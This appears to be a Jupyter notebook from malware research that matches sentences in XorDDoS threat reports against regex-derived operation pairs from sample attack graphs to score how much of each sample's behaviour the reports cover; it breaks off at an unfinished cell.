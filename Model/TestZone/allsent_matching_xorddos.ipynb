{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\Users\\luweb\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\tqdm\\auto.py:22: TqdmWarning:IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "import os\n",
    "from os import listdir\n",
    "from os.path import isfile, join\n",
    "from pathlib import Path\n",
    "import pandas as pd\n",
    "import pickle\n",
    "from typing import Dict, List, get_type_hints\n",
    "from styleframe import StyleFrame, Styler\n",
    "from IPython.display import display\n",
    "\n",
    "''' 自己寫的模組 '''\n",
    "from cc_regex_script import RegexMatchResult, RegexMaster \n",
    "from cc_nlp_script import find_verb_of_vocab, OperationMode, OperationEvaluator\n",
    "from cc_module_cust import AttackGraph, Node, Edge, FileTable #, build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load 所有 Dofloo 的 object，計算並儲存其 regex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "family Xorddos has numOfSample 21, first is 07c070b717a23453a2b71c7582d6a928\n",
      "samplename: ['0aefb67c01a24d05351b093455203fa2']\n"
     ]
    }
   ],
   "source": [
    "family = 'Xorddos' # Dofloo Xorddos\n",
    "\n",
    "sample_info = pd.read_csv('../../C malware info/sample_info.csv')\n",
    "dofloo_info = sample_info[(sample_info['family'] == family) & \n",
    "            (~sample_info['filename'].isin(['8845355172c485813872f1bb1834de15.bin']))]\n",
    "samplename_lst = dofloo_info['filename'].to_list()\n",
    "samplename_lst = [name.split('.')[0] for name in samplename_lst]\n",
    "print(f\"family {family} has numOfSample {len(samplename_lst)}, first is {samplename_lst[0]}\")\n",
    "\n",
    "if family == 'Dofloo':\n",
    "    samplename_lst = ['0046a78514a658b9b7a4e29e8581f85b'] # 只先使用這個 dof sample\n",
    "if family == 'Xorddos':\n",
    "    samplename_lst = ['0aefb67c01a24d05351b093455203fa2'] # 只先使用這個 xor sample\n",
    "\n",
    "print('samplename:', samplename_lst)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "{<OP act=a, obj=a>}\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "<>:23: DeprecationWarning:invalid escape sequence '\\s'\n",
      "<>:23: DeprecationWarning:invalid escape sequence '\\s'\n",
      "C:\\Users\\luweb\\AppData\\Local\\Temp\\ipykernel_15160\\1514683367.py:23: DeprecationWarning:invalid escape sequence '\\s'\n"
     ]
    }
   ],
   "source": [
    "def prettifyName(item:str) -> str:\n",
    "    pretty_name = {\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        r\"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        r\"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "    }\n",
    "    changed = pretty_name.get(item, None)\n",
    "    if changed:\n",
    "        return changed\n",
    "    return item\n",
    "\n",
    "def get_object_type(objReg: str) -> str:\n",
    "    ''' temp function, put in cc_regex_scrpt '''\n",
    "    if objReg in [r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\", \n",
    "                r\"[a-zA-z]:\\d{1,5}$\", r\"port \\d{1,5}$\",\n",
    "                r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d{1,5}$\", \"eth[0-9]$\"]:\n",
    "        return 'NET'\n",
    "    if objReg in [\"0x[0-9a-zA-Z]{8}\"]:\n",
    "        return 'MEM'\n",
    "    if objReg in [\"^sed$\", \"^sh$\", \"^chkconfig$\", \"^systemctl$\", \"update-rc.d\", \"/boot/[a-z]{10}\",r\"^pipe(\\$|\\.|$)\"]:\n",
    "        return 'PROC'\n",
    "    if objReg in [r\"UID(\\$|\\.|$)\", r\"GID(\\$|\\.|$)\", \"UID\", \"GID\", \"permission(\\s|:)[0-9]{1,4}\"]:\n",
    "        return 'INFO'\n",
    "    return 'FILE'\n",
    "\n",
    "class OperationPair:\n",
    "    SYSCALL = 0\n",
    "    VERB = 1\n",
    "\n",
    "    def __init__(self, action:str, object:str, type:int=0, subject:str=None, step_number:int=None \\\n",
    "                 , original_object=None, original_sentence=None, object_type=None):\n",
    "        self.object:str = object # regex\n",
    "        self.action:str = action # verb or syscall\n",
    "        self.type:int = type # action type\n",
    "        self.object_type:str = object_type # FILE, NET, PROC, MEM, INFO\n",
    "        self.subject:str = subject\n",
    "        self.step_number:int = step_number\n",
    "        self.original_object:str = original_object # can store original matched word (object) from CTD\n",
    "        self.original_sentence:str = original_sentence # can store the mathced sentence\n",
    "        pass\n",
    "\n",
    "    def __eq__(self, other): \n",
    "        if not isinstance(other, OperationPair):\n",
    "            # don't attempt to compare against unrelated types\n",
    "            return NotImplemented\n",
    "        # Same if <action, object> pair is same (type is not consider yet)\n",
    "        return self.action == other.action and self.object == other.object\n",
    "\n",
    "    def __hash__(self) -> int:\n",
    "        # necessary for instances to behave sanely in dicts and sets.\n",
    "        return hash((self.action, self.object))\n",
    "\n",
    "    def __str__(self) -> str:\n",
    "        if self.step_number:\n",
    "            return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "        return f\"<OP act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "    def __repr__(self) -> str:\n",
    "        return str(self)\n",
    "    def getSentStr(self) -> str:\n",
    "        '''return string contains original_object & flat_sentence'''\n",
    "        flat_sentence = \" \".join(self.original_sentence.splitlines())\n",
    "        return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.original_object)}, sent={flat_sentence}>\"\n",
    "        \n",
    "# test case\n",
    "p_aa = OperationPair('a','a')\n",
    "p_aaz = OperationPair('a','a')\n",
    "p_ab = OperationPair('a','b')\n",
    "\n",
    "print(p_aa == p_aaz) # True\n",
    "print(set([p_aa, p_aaz])) # one element\n",
    "\n",
    "def construct_sample_OPset(step_list: list, keep_src_node=False, debug=False, rt_order=True) -> set:\n",
    "    '''return a list of OPset. RegexMaster and family are gobal variable.'''\n",
    "    if debug:\n",
    "        print('step_list len:', len(set(step_list)))\n",
    "    OPlst_raw = list((src_node.name, dst_node.name, syscall) for (src_node, dst_node, syscall) in step_list) # object is raw\n",
    "    OPset_raw = list(dict.fromkeys(OPlst_raw))\n",
    "    if debug:\n",
    "        print('OPlst_raw len:', len(OPlst_raw)) # why len is 123100? (while step_list len is 7775) (must be equal)\n",
    "        print(f\"OPlst_raw: {OPlst_raw[:10]}\")\n",
    "        print('OPset_raw len:', len(OPset_raw)) # len is 5925 for xor\n",
    "        print(f\"OPset_raw: {OPset_raw[:10]}\")\n",
    "    regexMaster = RegexMaster(familyname=family)\n",
    "    regex_pool = regexMaster.get_all_regex()\n",
    "    OPset = set()\n",
    "    OPset_ordered = list()\n",
    "    for (src_node, dst_node, syscall) in OPset_raw:\n",
    "        regex_dst_node_list = RegexMaster.find_spacial_token_with_regex(regex_pool, dst_node)\n",
    "        if regex_dst_node_list is None or len(regex_dst_node_list) == 0:\n",
    "            continue\n",
    "        for regex_result in regex_dst_node_list:\n",
    "            dst_node = regex_result.match_regex\n",
    "            step_number = len(OPset) + 1\n",
    "            if keep_src_node:\n",
    "                op = OperationPair(syscall, dst_node, subject=src_node, step_number=step_number)\n",
    "                OPset.add(op) # keep src_node in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "            else:\n",
    "                op = OperationPair(syscall, dst_node, step_number=step_number)\n",
    "                OPset.add(op) # only dst_node, syscall in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "    if debug:\n",
    "        print('OPset len:', len(OPset), 'OPset_ordered len:', len(OPset_ordered))\n",
    "    if rt_order:\n",
    "        return OPset, OPset_ordered\n",
    "    return OPset\n",
    "\n",
    "# def construct_sample_stepList(step_list: list, keep_src_node=False, debug=False) -> list:\n",
    "#     ''''''\n",
    "#     pass\n",
    "\n",
    "# test\n",
    "# sample_OPset = construct_sample_OPset(asg.step_list, debug=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exam: sample S1 matches 31 of regex\n",
      "Size of regex_pool: 31, size of total_used_regex: 0\n"
     ]
    }
   ],
   "source": [
    "class Sample:\n",
    "    def __init__(self, samplename:str, regex_set:set=None, special_token_dict=None, step_list=None) -> None:\n",
    "        self.samplename: str = samplename\n",
    "        self.regex_set: set = set()\n",
    "        if regex_set:\n",
    "            self.regex_set = regex_set\n",
    "        self.special_token_dict = {}\n",
    "        if special_token_dict:\n",
    "            self.special_token_dict: dict = special_token_dict # list of dict\n",
    "        if step_list:\n",
    "            self.step_list = step_list\n",
    "            OPset, OPset_ordered = construct_sample_OPset(step_list)\n",
    "            self.OPset: set[OperationPair] = OPset\n",
    "            self.OPset_ordered: list[OperationPair] = OPset_ordered # 依照出現順序排序的 OPset (元素相同順序不同)\n",
    "            self.OPset_sysOnly_ordered = [] # 尚未初始化 只儲存改變系統狀態的 OP 的物件\n",
    "            self.OPset_sysOnly_ordered_index = [] # 尚未初始化 只儲存改變系統狀態的 OP 的 index\n",
    "            del OPset, OPset_ordered\n",
    "        pass\n",
    "    def __repr__(self) -> str:\n",
    "        return f\"<Sample self.samplename>\"\n",
    "\n",
    "''' 讀取 ASG 中的 set_of_object (就是這個樣本的 special_token_dict)，並歸納樣本的 regex_set '''\n",
    "regexMaster = RegexMaster(familyname=family)\n",
    "regex_pool = regexMaster.get_all_regex()\n",
    "# total_used_regex = set()\n",
    "samples: list[Sample] = []\n",
    "for samplename in samplename_lst:\n",
    "    with open(f'../../C ASG statistics 1115ver/saved_pkl/{family}/{samplename}.pkl', 'rb') as inp:\n",
    "        asg: AttackGraph = pickle.load(inp) # asg.set_of_object is dict() (key:spacial token, value: type 首字大寫)\n",
    "        sample = Sample(samplename, special_token_dict=asg.set_of_object, step_list=asg.step_list)\n",
    "        sample.regex_set = set(regex_pool) # 直接使用志剛寫的作為這個樣本的 baseline\n",
    "        # for obj in sample.special_token_dict.keys():\n",
    "        #     matched_list: list[RegexMatchResult] = regexMaster.find_spacial_token(obj)\n",
    "        #     if matched_list:\n",
    "        #         # print(obj, matched_list)\n",
    "        #         [sample.regex_set.add(m.match_regex) for m in matched_list]\n",
    "        #         # [total_used_regex.add(m.match_regex) for m in matched_list]\n",
    "        # print('------', sample.regex_set)\n",
    "        # break\n",
    "        samples.append(sample)\n",
    "    # del asg\n",
    "print(f'Exam: sample S1 matches {len(samples[0].regex_set)} of regex')\n",
    "print(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "set()"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 只差這四個不在 asg set_of_object 中 {'0x[0-9a-zA-Z]{8}', 'GID', 'UID', 'port \\\\d{1,5}$'}\n",
    "set(regex_pool) - samples[0].regex_set"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' Save result to txt file 沒事不要 run ! '"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "''' Save result to txt file 沒事不要 run ! '''\n",
    "# total_regex = set()\n",
    "# with open('./result/countof_regexset.txt', 'w', encoding='utf-8') as opf:\n",
    "#     # header\n",
    "#     opf.write('{:12s}'.format('Sample no.'))\n",
    "#     for i in range(len(samples)):\n",
    "#         if i+1 < 10:\n",
    "#             opf.write(f' S{i+1} ')\n",
    "#         else:\n",
    "#             opf.write(f'S{i+1} ')\n",
    "#     opf.write('\\n')\n",
    "#     # opf.write('{:12s}'.format('# of regex'))\n",
    "#     num_of_regex_string = '{:12s}'.format('# of regex')\n",
    "#     num_of_objects_string = '{:12s}'.format('# of object ') # 所有的類別喔! 無過濾\n",
    "#     for i in range(len(samples)):\n",
    "#         # opf.write(f'{len(samples[i].regex_set):>3} ')\n",
    "#         num_of_regex_string += f'{len(samples[i].regex_set):>3} '\n",
    "#         num_of_objects_string += f'{len(samples[i].special_token_dict):>3} '\n",
    "#     opf.write(num_of_objects_string+'\\n')\n",
    "#     opf.write(num_of_regex_string)\n",
    "#     opf.write('\\n{:12s}'.format('Sample hash'))\n",
    "#     for i in range(len(samples)):\n",
    "#         opf.write(f'{samples[i].samplename[:3]:>3} ')\n",
    "#     opf.write('\\n\\n')\n",
    "#     opf.write(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}\\n\\n')\n",
    "\n",
    "#     # content of each sample\n",
    "#     for i,s in enumerate(samples):\n",
    "#         content_1 = f\"S{i+1} has {len(s.regex_set)} of regex\\n\"\n",
    "#         content_2 = f\"regex_set: {s.regex_set}\\n\"\n",
    "#         content_3 = f\"special_token_dict: {s.special_token_dict.keys()}\\n\"\n",
    "#         opf.writelines([content_1, content_2, content_3])\n",
    "#         opf.write('\\n\\n')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load Reports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Xorddos-Cdnetworks.csv',\n",
       " 'Xorddos-Crowdstrike.csv',\n",
       " 'Xorddos-Intezer.csv',\n",
       " 'Xorddos-Ms.csv',\n",
       " 'Xorddos-Trendmicro.csv',\n",
       " 'Xorddos-Trendmicro2.csv']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "report_fir_path = '../../C parse report/sentence csvs/'\n",
    "# family, samplename, outputfolder = 'Xorddos', '???', './result'\n",
    "outputfolder = './result'\n",
    "\n",
    "def get_all_filenames(dir: str='./') -> list:\n",
    "    ''' traverse root directory, and list directories as dirs and files as files. Return filenames in rootdir. '''\n",
    "    files = [f for f in listdir(dir) if isfile(join(dir, f))]\n",
    "    files.sort()\n",
    "    return files\n",
    "\n",
    "xor_report_names = [f for f in get_all_filenames(report_fir_path) if f.startswith(family)] # 只選擇這個家族的報告\n",
    "xor_report_dfs = [pd.read_csv(f\"{report_fir_path}{f}\") for f in xor_report_names]\n",
    "xor_report_names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Number</th>\n",
       "      <th>Content</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Sentence 1</td>\n",
       "      <td>understanding a xor.ddos attack\\n2月 17, 2021\\n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Sentence 2</td>\n",
       "      <td>xor.ddos is the name of the malware, not the a...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Sentence 3</td>\n",
       "      <td>it was detected in september 2014 and the anal...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Sentence 4</td>\n",
       "      <td>is a distributed denial-of-service attack from...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Sentence 5</td>\n",
       "      <td>in many ways it is and in this guide, we will ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Sentence 6</td>\n",
       "      <td>what is xor.ddos malware?</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Sentence 7</td>\n",
       "      <td>the traditional attack utilized the existing v...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Sentence 8</td>\n",
       "      <td>however, xor.ddos makes windows pcs into zombi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Sentence 9</td>\n",
       "      <td>the xor.ddos attack is used to defeat the netw...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Sentence 10</td>\n",
       "      <td>this is a very serious threat to the network b...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>Sentence 11</td>\n",
       "      <td>in addition to these primary targets, the udp ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>Sentence 12</td>\n",
       "      <td>however, the xor.ddos attack uses the tcp, whi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>Sentence 13</td>\n",
       "      <td>a brute force attack tries many random passwor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>Sentence 14</td>\n",
       "      <td>there are various types of brute force attacks...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>Sentence 15</td>\n",
       "      <td>origin of xor.ddos attacks\\n77.1 % of xor.ddos...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>Sentence 16</td>\n",
       "      <td>many large-scale cloud service providers were ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>Sentence 17</td>\n",
       "      <td>in addition, as ssh services (22/tcp) are bein...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>Sentence 18</td>\n",
       "      <td>countermeasures against xor.ddos attacks\\nthe ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>Sentence 19</td>\n",
       "      <td>syn is just a process to perform a 3-way hands...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>Sentence 20</td>\n",
       "      <td>if syn packets with data are detected, the xor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>Sentence 21</td>\n",
       "      <td>in addition, it is good to use a syn cookie ag...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>Sentence 22</td>\n",
       "      <td>the syn cookie blocks syn spoofing effectively...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>Sentence 23</td>\n",
       "      <td>the syn cookie does not require a certain time...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>Sentence 24</td>\n",
       "      <td>therefore, the syn cookie is a very effective ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>Sentence 25</td>\n",
       "      <td>alternatively, first syn drop can be a second ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>Sentence 26</td>\n",
       "      <td>this technique works by saving the first syn p...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>Sentence 27</td>\n",
       "      <td>if the session request is normal, the same ip ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>Sentence 28</td>\n",
       "      <td>if the request is made for attack, another syn...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>Sentence 29</td>\n",
       "      <td>conclusion – get a ddos mitigation service\\na ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>Sentence 30</td>\n",
       "      <td>the content delivery network industry can prov...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>Sentence 31</td>\n",
       "      <td>as the services are cloud-based, the available...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>Sentence 32</td>\n",
       "      <td>with these services, most companies will benef...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Number                                            Content\n",
       "0    Sentence 1  understanding a xor.ddos attack\\n2月 17, 2021\\n...\n",
       "1    Sentence 2  xor.ddos is the name of the malware, not the a...\n",
       "2    Sentence 3  it was detected in september 2014 and the anal...\n",
       "3    Sentence 4  is a distributed denial-of-service attack from...\n",
       "4    Sentence 5  in many ways it is and in this guide, we will ...\n",
       "5    Sentence 6                          what is xor.ddos malware?\n",
       "6    Sentence 7  the traditional attack utilized the existing v...\n",
       "7    Sentence 8  however, xor.ddos makes windows pcs into zombi...\n",
       "8    Sentence 9  the xor.ddos attack is used to defeat the netw...\n",
       "9   Sentence 10  this is a very serious threat to the network b...\n",
       "10  Sentence 11  in addition to these primary targets, the udp ...\n",
       "11  Sentence 12  however, the xor.ddos attack uses the tcp, whi...\n",
       "12  Sentence 13  a brute force attack tries many random passwor...\n",
       "13  Sentence 14  there are various types of brute force attacks...\n",
       "14  Sentence 15  origin of xor.ddos attacks\\n77.1 % of xor.ddos...\n",
       "15  Sentence 16  many large-scale cloud service providers were ...\n",
       "16  Sentence 17  in addition, as ssh services (22/tcp) are bein...\n",
       "17  Sentence 18  countermeasures against xor.ddos attacks\\nthe ...\n",
       "18  Sentence 19  syn is just a process to perform a 3-way hands...\n",
       "19  Sentence 20  if syn packets with data are detected, the xor...\n",
       "20  Sentence 21  in addition, it is good to use a syn cookie ag...\n",
       "21  Sentence 22  the syn cookie blocks syn spoofing effectively...\n",
       "22  Sentence 23  the syn cookie does not require a certain time...\n",
       "23  Sentence 24  therefore, the syn cookie is a very effective ...\n",
       "24  Sentence 25  alternatively, first syn drop can be a second ...\n",
       "25  Sentence 26  this technique works by saving the first syn p...\n",
       "26  Sentence 27  if the session request is normal, the same ip ...\n",
       "27  Sentence 28  if the request is made for attack, another syn...\n",
       "28  Sentence 29  conclusion – get a ddos mitigation service\\na ...\n",
       "29  Sentence 30  the content delivery network industry can prov...\n",
       "30  Sentence 31  as the services are cloud-based, the available...\n",
       "31  Sentence 32  with these services, most companies will benef..."
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xor_report_dfs[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 單篇文章的 Class 和 整個 Family 的 Class\n",
    "`baseline: Dict[str, list]` 改為 `regexMaster: RegexMaster`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "class ReportEvalModel:\n",
    "    def __init__(self, regex_set: set, sentences: pd.DataFrame, reportname:str=''):\n",
    "        self.regex_pool: set[str] = regex_set # 樣本or家族含有的 regex 集合\n",
    "        self.sentences = sentences # a df\n",
    "        self.reportname = reportname\n",
    "        cols = list(regex_pool)\n",
    "        self.match_tbl = pd.DataFrame([[0]*len(cols)]*len(sentences), columns=cols)\n",
    "        self.match_word:dict[(int,str), str] = dict() # key(idx_sent,regex) value(word:str)\n",
    "        self.match_regex = set()\n",
    "        self.doc_OPset:set[OperationPair] = set() # Set of doc's OperationalPair\n",
    "        self.match_doc_OPset:set[OperationPair] = set()\n",
    "        self.OPset_order_index = [] # 紀錄 ASG OP 的出現順序 (lifecycle)\n",
    "        self.SysOPset_order_index = [] # 只紀錄改變系統的\n",
    "        # self.asgSysOPset_order_index = []\n",
    "        # self.regexMaster = regexMaster # 其實應該用 class function 就不用傳入一個物件\n",
    "        self.match()\n",
    "\n",
    "    def match(self) -> None:\n",
    "        '''find baseline in sentences of report. Fill matching result in self.match_tbl.'''\n",
    "        sentence_list = self.sentences['Content']\n",
    "        for idx_sent, sent in enumerate(sentence_list):\n",
    "            # print(idx_sent, sent)\n",
    "            # find regexs in a sentence\n",
    "            matched_list: list[RegexMatchResult] = RegexMaster.find_spacial_token_with_regex(self.regex_pool, sent)\n",
    "            if not matched_list:\n",
    "                continue\n",
    "            for m in matched_list:\n",
    "                this_re = m.match_regex\n",
    "                matched_word = m.word\n",
    "                # print(matched_word, '|',sent[:10])\n",
    "                self.match_word[(idx_sent,this_re)] = m.word # 紀錄被 search 到的單字\n",
    "                # self.match_tbl.loc[idx_sent,this_re] = 1 # mark as found 節省空間\n",
    "                self.match_regex.add(this_re)\n",
    "                en_verb = find_verb_of_vocab(sent, m.word)\n",
    "                # print(f\"---\\nen_verb: {en_verb}, m.word: {m.word}, sent: {sent}\") # 列印所有動詞抓取情形\n",
    "                stepn = len(self.doc_OPset) + 1\n",
    "                # 如果 action 和 matched regex 相同，即使報告中object的原字串不同，也不會多計入。\n",
    "                if en_verb:\n",
    "                    self.doc_OPset.add(OperationPair(en_verb, this_re, type=OperationPair.VERB, original_object=m.word, \n",
    "                    step_number=stepn, original_sentence=sent, object_type=get_object_type(this_re))) # has verb\n",
    "                else:\n",
    "                    self.doc_OPset.add(OperationPair(None, this_re, type=OperationPair.VERB, original_object=m.word, \n",
    "                                                     step_number=stepn, object_type=get_object_type(this_re))) # no verb\n",
    "        pass\n",
    "    \n",
    "    def get_match_sentences(self) -> pd.DataFrame:\n",
    "        result = self.match_tbl.copy()\n",
    "        result['match'] = result.sum(axis=1)\n",
    "        return result\n",
    "    \n",
    "    def get_match_regexs(self) -> set:\n",
    "        return self.match_regex\n",
    "\n",
    "    def get_match_word(self, idx_sent:int, regex:str) -> str:\n",
    "        return self.match_word[(idx_sent, regex)]\n",
    "\n",
    "class FamilySet:\n",
    "    '''一個 malware family report 集合'''\n",
    "    def __init__(self, familyname:str, regexMaster: RegexMaster, sample: Sample=None):\n",
    "        self.familyname = familyname\n",
    "        self.regexMaster = regexMaster\n",
    "        self.num_of_used_regex = len(regexMaster.used_regex_set) # 這個家族含規則的總數量 (unoin by all samples)\n",
    "        self.sample = None\n",
    "        if sample:\n",
    "            self.sample = sample\n",
    "            self.num_of_used_regex = len(sample.regex_set) # 改以這個樣本規則的總數量為基準\n",
    "        self.rem_lst: List[ReportEvalModel] = [] # list of ReportEvalModel under this family\n",
    "        self.result_tbl = None\n",
    "\n",
    "    def add_rem(self, sentences: pd.DataFrame, reportname: str=''):\n",
    "        '''新增 report 到 FamilySet 中，需傳入文本和報告名稱，會沿用 FamilySet 的 baseline.'''\n",
    "        if self.sample:\n",
    "            rem = ReportEvalModel(list(self.sample.regex_set), sentences, reportname) # 基準是 Sample\n",
    "            self.rem_lst.append(rem)\n",
    "            return\n",
    "        rem = ReportEvalModel(self.regexMaster, sentences, reportname) # 基準是 Family union # need fix -> no first arg now\n",
    "        self.rem_lst.append(rem)\n",
    "\n",
    "    def calc_report_coverage_score(self, match_regexs: list[str], apply_weight=False) -> float:\n",
    "        '''計算這篇報告的 coverage_score，未處理分母為0之情形'''\n",
    "        if not apply_weight:\n",
    "            return len(match_regexs) / self.num_of_used_regex # 無權種的算法，分母是家族 wide\n",
    "        ''' 以下 有權重的算法尚未修改，必出 bug '''\n",
    "        # denominator = sum(self.regexMaster['weight']) # 分母\n",
    "        # numerator = 0 # 分子\n",
    "        # for b, w in zip(self.regexMaster['text'], self.regexMaster['weight']):\n",
    "        #     if b in match_baselines:\n",
    "        #         numerator += w\n",
    "        # return numerator/denominator\n",
    "\n",
    "    def show_result(self, apply_weight: bool=False, base_on_sample = True):\n",
    "        '''print and return result table. baselinse(x) * report(y).'''\n",
    "        column_names = ['report_name','ttl_match','coverage_score']\n",
    "        if base_on_sample:\n",
    "            column_names.extend(list(self.sample.regex_set))\n",
    "        else:\n",
    "            column_names.extend(list(regexMaster.used_regex_set))\n",
    "        result_tbl = pd.DataFrame([[0]*len(column_names)]*len(self.rem_lst), columns=column_names)\n",
    "        for i,rem in enumerate(self.rem_lst):\n",
    "            match_regexes = rem.get_match_regexs() # 這篇報告含有哪些 baseine:set\n",
    "            c_score = self.calc_report_coverage_score(match_regexes, apply_weight=apply_weight)\n",
    "            result_tbl.loc[i,'report_name'] = rem.reportname\n",
    "            result_tbl.loc[i,'ttl_match'] = len(match_regexes)\n",
    "            result_tbl.loc[i,'coverage_score'] = f'{c_score:.4}'\n",
    "            for b in match_regexes:\n",
    "                result_tbl.loc[i,b] = 1\n",
    "            print(rem.reportname, match_regexes)\n",
    "        display(result_tbl)\n",
    "        return result_tbl"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: 存檔每篇報告的 matched sentence (以樣本的 regex set 為基準)\n",
    "比較樣本間的辨別度，有 n 個樣本，就會跑 n 變，得出 n 個結果 (FanilySet)"
   ]
  },
  {
   "cell_type": "code",
